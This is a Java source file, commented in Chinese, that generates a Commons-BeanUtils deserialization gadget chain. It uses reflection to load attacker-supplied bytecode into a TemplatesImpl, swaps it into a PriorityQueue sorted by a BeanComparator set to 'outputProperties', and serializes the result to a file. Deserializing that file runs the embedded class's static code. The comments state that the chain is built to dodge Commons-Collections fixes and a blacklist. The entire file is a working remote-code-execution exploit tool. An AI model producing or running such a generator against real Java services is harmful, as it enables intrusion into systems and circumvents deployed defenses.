// 手搓 CB 链生成器：PriorityQueue + BeanComparator(JDK比较器) + TemplatesImpl(自编译弹头)
// 串里零 CC 类 -> CC 3.2.2 的 functor 锁无关；黑名单四条全不沾
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class GenCB {
    public static void main(String[] args) throws Exception {
        byte[] sticker = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(args[0]));
        String outFile = args[1];

        // 1. TemplatesImpl 装弹：_name/_bytecodes/_tfactory 三个私有字段反射塞
        TemplatesImpl tpl = new TemplatesImpl();
        set(tpl, "_name", "X");
        set(tpl, "_bytecodes", new byte[][]{sticker});
        set(tpl, "_class", null);
        set(tpl, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());

        // 2. 比较器：property 先留 null（构造期不触发），入队后才改成 outputProperties
        BeanComparator cmp = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> q = new PriorityQueue<>(2, cmp);
        q.add("1"); q.add("2");   // 两个元素，readObject 时 heapify 必然触发 compare
        // 把模板对象偷换进队里（直接 add 会在本地就引爆）——两个槽位都换，比较器碰谁都是模板
        Field f = PriorityQueue.class.getDeclaredField("queue");
        f.setAccessible(true);
        Object[] arr = (Object[]) f.get(q);
        arr[0] = tpl;
        arr[1] = tpl;

        // 3. 现在才把 property 设成 outputProperties（getOutputProperties -> newTransformer -> defineClass -> 静态块起爆）
        Field pf = BeanComparator.class.getDeclaredField("property");
        pf.setAccessible(true);
        pf.set(cmp, "outputProperties");

        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(outFile));
        o.writeObject(q);
        o.close();
        System.out.println(outFile + " ok (" + new java.io.File(outFile).length() + " bytes)");
    }
    static void set(Object o, String name, Object val) throws Exception {
        Field f = o.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(o, val);
    }
}
